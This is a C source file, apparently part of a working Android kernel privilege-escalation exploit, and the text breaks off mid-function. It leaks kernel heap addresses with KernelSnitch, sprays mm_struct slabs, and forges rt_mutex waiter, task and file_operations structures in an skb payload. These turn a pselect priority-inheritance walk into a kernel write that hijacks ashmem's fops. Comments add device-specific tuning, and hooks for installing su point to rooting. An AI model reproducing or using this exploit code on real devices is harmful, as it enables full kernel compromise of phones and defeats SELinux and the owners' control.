#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

/* Constrained write via pselect PI-walk stack overwrite.
 * mode=1: left-write *target = value|color (live use: *ashmem_misc.fops =
 *         fake_fops — the FOPS hijack; FOPS_PI_ONLY also targets boot_id)
 */
int pselect_custom_write;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_child_node;

void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
  pselect_custom_value = 0;
  pselect_child_node = 0;
}

int pselect_custom_write_enabled(void) {
  return pselect_custom_write != 0;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_info("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_info("startup limits pid=%d %s\n", getpid(), limits);
  pr_info("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_info("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_info("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  /*
   * a.so sched_setattr_tid (0x17174): hardcodes size=48, policy=SCHED_BATCH(3),
   * nice=arg1; syscall(__NR_sched_setattr=274). Live PKJ110: errno=0.
   * Use exact 48 — do not trust sizeof if headers grow (util_min/max).
   */
  memset(&attr, 0, sizeof(attr));
  attr.size = 48;
  attr.sched_policy = 3; /* SCHED_BATCH — match a.so rodata, not only macro */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(SYS_sched_setattr, tid, &attr, 0);
  if (ret != 0 && errno == EINVAL) {
    memset(&attr, 0, sizeof(attr));
    attr.size = 48;
    attr.sched_policy = SCHED_NORMAL;
    attr.sched_nice = nice_value;
    errno = 0;
    ret = syscall(SYS_sched_setattr, tid, &attr, 0);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

/*
 * KIMAGE chain probe (research): after GhostLock P0 write-confirm without
 * text entropy, log static p0 addresses that *would* yield KIMAGE if an
 * arb-R existed (leak_kernel_base math). Does NOT set kaslr_done.
 * GhostLock alone cannot read these slots — only write attacker-chosen values.
 */
void kimage_chain_probe(void) {
  uintptr_t fops = p0_data_alias(ASHMEM_FOPS);
  uintptr_t open_slot = fops + FOPS_OPEN_OFF;
  uintptr_t ioctl_slot = fops + FOPS_IOCTL_OFF;
  uintptr_t misc = p0_data_alias(ASHMEM_MISC_FOPS);
  uintptr_t selinux = p0_data_alias(SELINUX_ENFORCING);
  /* Use dprintf+fsync: pr_* may be lost if constructor exits immediately. */
  dprintf(STDERR_FILENO,
          "[*] kimage_chain_probe kaslr_done=%d base=%016zx slide=%016zx\n",
          kaslr_done, kaslr_base, kaslr_slide);
  dprintf(STDERR_FILENO,
          "[*] kimage_chain_probe p0 ashmem_fops=%016zx open_slot=%016zx "
          "ioctl_slot=%016zx misc_fops=%016zx selinux_state=%016zx\n",
          fops, open_slot, ioctl_slot, misc, selinux);
  dprintf(STDERR_FILENO,
          "[*] kimage_chain_probe recipe: arb-R then "
          "kaslr_base=read64(open_slot)-ASHMEM_OPEN_OFF; "
          "GhostLock cannot supply that read; no false kaslr_done\n");
  fsync(STDERR_FILENO);
}

uintptr_t data_addr(uintptr_t image_addr) {
  /*
   * Image .data/.bss physmap alias (Android arm64).
   * Research: Project Zero "Defeating KASLR by Doing Nothing"; Nebula GhostLock
   * writeup (KASLR is separate; GhostLock is constrained write).
   * page_base is KernelSnitch mm_struct heap — MUST NOT be used as image base.
   * p0_data_alias: phys = PHYS_LOAD + (image - KIMAGE); va = (phys - PHYS_OFFSET) | P0.
   */
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  /*
   * ALWAYS leaf-safe first 24 bytes (owner/llseek/read = 0).
   * Device fact: if fake_fops is used as rb parent/right during PI walk,
   * non-zero +8 (llseek) is walked as rb_node.right → panic.
   * configfs uses read_iter/write_iter @ +0x20/+0x28 — safe after leaf head.
   * llseek filled later by repair_fake_fops_llseek() after hijack if needed.
   */
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF, 0);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);

  /*
   * Handlers only when kaslr_done. Leaf head stays 0 always.
   * Do NOT zero handlers just because pselect_custom_write is set:
   * ASO stack left-write uses custom mode=1 but still needs filled
   * handlers for try_cfi_stage after the PI route.
   * rb_node only covers first 24B — slots at +0x20+ are not walked.
   */
  if (!kaslr_done) {
    put64(p, off + FOPS_READ_ITER_OFF, 0);
    put64(p, off + FOPS_WRITE_ITER_OFF, 0);
    put64(p, off + FOPS_IOCTL_OFF, 0);
    put64(p, off + FOPS_COMPAT_IOCTL_OFF, 0);
    put64(p, off + FOPS_MMAP_OFF, 0);
    put64(p, off + FOPS_OPEN_OFF, 0);
    put64(p, off + FOPS_RELEASE_OFF, 0);
    put64(p, off + FOPS_SPLICE_READ_OFF, 0);
    put64(p, off + FOPS_SHOW_FDINFO_OFF, 0);
    return;
  }

  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  if (len >= ASHMEM_NAME_LEN) {
    pr_error("try_put_blob_no_zeros: len=%zu exceeds ASHMEM_NAME_LEN=%d\n",
             len, ASHMEM_NAME_LEN);
    return -1;
  }
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  if (pos >= ASHMEM_NAME_LEN) {
    pr_error("try_put_blob_zero_at: pos=%zu exceeds ASHMEM_NAME_LEN=%d\n",
             pos, ASHMEM_NAME_LEN);
    return -1;
  }
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  /*
   * The custom write (stack left-write, mode=1) IS the live FOPS-hijack
   * path. It lands with a thinner heap setup than the old full-classic
   * spray (proven on device). prepare_slabs=6: cut clone/memfd cost vs
   * 8/12 without killing route rate; spray partials: 3 instead of
   * MM_PARTIALS(5). Full 32-slab setup kept for non-custom diagnostics.
   */
  int custom = pselect_custom_write_enabled();
  size_t prepare_slabs = custom ? 6 : 32;
  prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
  if (!prepare_ctx.childs || !prepare_ctx.memfds) {
    pr_error("prepare_ctxs: prepare_ctx calloc OOM\n");
    _exit(1);
  }

  size_t spray_partials = custom ? 3 : (1 + MM_PARTIALS);
  spray_ctx.mm_cnt = spray_partials * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);
  if (!spray_ctx.childs || !spray_ctx.memfds) {
    pr_error("prepare_ctxs: spray_ctx calloc OOM\n");
    _exit(1);
  }

  pre_ctx.mm_cnt = custom ? (mm_objs_per_slab / 2) : (mm_objs_per_slab - 1);
  if (pre_ctx.mm_cnt < 1) {
    pre_ctx.mm_cnt = 1;
  }
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);
  if (!pre_ctx.childs || !pre_ctx.memfds) {
    pr_error("prepare_ctxs: pre_ctx calloc OOM\n");
    _exit(1);
  }

  post_ctx.mm_cnt = custom ? (mm_objs_per_slab / 2) : mm_objs_per_slab;
  if (post_ctx.mm_cnt < 1) {
    post_ctx.mm_cnt = 1;
  }
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
  if (!post_ctx.childs || !post_ctx.memfds) {
    pr_error("prepare_ctxs: post_ctx calloc OOM\n");
    _exit(1);
  }
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    if (pselect_custom_write) {
      /*
       * Custom stack write: stack.tree.parent = target-8 (armed in
       * prepare_pselect_fdsets). Page stays leaf-safe: fake_right=0,
       * fake_left=0. Do NOT fill fake_parent with misc.fops-8 here —
       * page parent-store panics (walks real ashmem_fops as rb).
       */
      fake_right = 0;
      fake_left = 0;
      fake_parent = pselect_custom_target - 8;
    } else {
      /*
       * DEPRECATED on PKJ110: page parent-store with parent=misc.fops-8
       * panics (walks real ashmem_fops as rb). ASO/FOPS_PI use stack
       * mode=1 left-write instead; page only supplies fake_task/lock/fops.
       */
      fake_parent = 0;
      fake_right = fake_fops;
      fake_left = 0;
    }
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    /*
     * SLIDE payload: do NOT leave fake_parent=misc.fops-8 (misleading logs
     * and accidental use). Write topology is loggers→boot_id via write_*.
     */
    fake_parent = 0;
    fake_right = 0;
    fake_left = 0;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_parent;
  uintptr_t write_right = fake_right;
  uintptr_t write_left = fake_left;
  uint64_t waiter_task = SLIDE_INIT_TASK;
  uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
  uint64_t pi_top_task = SLIDE_INIT_TASK;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    /*
     * a.so prepare_skb mode=1: profile+0x140=loggers, +0x148=bootid_data → p0.
     * Default match that (not nfulnl×sysctl). Env can override for matrix.
     */
    write_pc = SLIDE_LOGGERS_0_1;
    write_left = SLIDE_BOOTID_DATA;
    {
      char *sp = getenv("GHOSTLOCK_SLIDE_PARENT");
      if (sp && (sp[0] == 'n' || sp[0] == 'N')) {
        write_pc = SLIDE_NFULNL_LOGGER;
      } else if (sp && (sp[0] == 'l' || sp[0] == 'L')) {
        write_pc = SLIDE_LOGGERS_0_1;
      }
      char *sb = getenv("GHOSTLOCK_SLIDE_BOOTID");
      if (sb && (sb[0] == 's' || sb[0] == 'S')) {
        write_left = SLIDE_RANDOM_BOOT_ID_DATA;
      } else if (sb && (sb[0] == 'd' || sb[0] == 'D')) {
        write_left = SLIDE_BOOTID_DATA;
      }
      pr_info("slide topo: parent=%s p0=%016llx left=%s p0=%016llx\n",
              (write_pc == SLIDE_NFULNL_LOGGER) ? "nfulnl" : "loggers",
              (unsigned long long)write_pc,
              (write_left == SLIDE_BOOTID_DATA) ? "bootid_data" : "sysctl_bootid",
              (unsigned long long)write_left);
    }
    write_right = 0;
    /* fake_task not init_task — avoids init_task PI wake panic on OPPO. */
    waiter_task = fake_task;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = fake_task;
  } else if (pselect_custom_write == 1) {
    /*
     * Left-write: *left = parent|color (full 8 bytes).
     * store_value=0 → parent=page_base (proven). Non-zero custom_value only
     * when caller explicitly sets it (fake_fops for the FOPS hijack).
     */
    write_pc = pselect_custom_value ? pselect_custom_value : base;
    write_right = 0;
    write_left = pselect_custom_target;
    waiter_task = fake_task;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = fake_task;
  } else if (!pselect_custom_write) {
    /* fake_task only — never init_task on OPPO (wake path panic). */
    waiter_task = fake_task;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = fake_task;
    /*
     * DEPRECATED on PKJ110: page parent-store write_pc=misc.fops-8 panics
     * (walks real ashmem_fops as rb). ASO uses stack mode=1 left-write
     * after prepare; page must stay leaf-safe (zeros). Do NOT arm misc-8.
     */
    write_pc = 0;
    write_right = 0;
    write_left = 0;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE || pselect_custom_write == 1) {
      /* SLIDE / stack left-write: empty lock waiters (device-proven alive). */
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
      /*
       * FOPS page for ASO: same empty lock as SLIDE. Do NOT set owner
       * HAS_WAITERS with page parent-store (misc.fops-8 path panics).
       * Stack mode=1 supplies the left-write after prepare.
       */
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1ULL);
    }

    /*
     * W0 layout:
     * - SLIDE / custom left-write: tree carries write_* .
     * - FOPS / mode2: tree zeros; pi_tree carries parent-store.
     */
    if (payload_mode == PAGE_PAYLOAD_FOPS && pselect_custom_write != 1) {
      put64(p, W0_OFF + 0x00, 0);
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
    } else {
      put64(p, W0_OFF + 0x00, write_pc);
      put64(p, W0_OFF + 0x08, write_right);
      put64(p, W0_OFF + 0x10, write_left);
    }
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF,
          (payload_mode == PAGE_PAYLOAD_FOPS)
              ? (uint64_t)fake_task
              : waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 3);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      /* slide: classic lock-tree style; pi_waiters still point at W0 */
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    } else {
      /*
       * FOPS / custom: JoinChang — fake_task.pi_waiters → W0.pi_tree so
       * dequeue_pi parent-stores write_pc into *target.
       */
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  if (!skb_buf) {
    pr_error("prepare_kernel_page: skb_buf malloc OOM size=%zu\n",
             (size_t)SKB_SEND_SIZE);
    _exit(1);
  }
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
